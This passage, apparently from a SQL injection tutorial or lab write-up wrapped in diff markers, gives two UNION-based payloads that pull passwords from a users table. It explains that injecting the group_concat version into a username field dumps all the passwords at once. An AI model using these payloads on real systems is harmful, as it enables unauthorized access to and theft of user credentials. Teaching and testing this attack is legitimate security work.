@@ -1,0 +1,11 @@
+`
+
+' UNION SELECT 1, password from users-- -
+However, this statement will only return one password. The group_concat() function can help achieve the goal of dumping all the passwords simultaneously. 
+By injecting the following code into the username field:
+
+' UNION SELECT 1,group_concat(password) FROM users-- -
+
+
+
+`
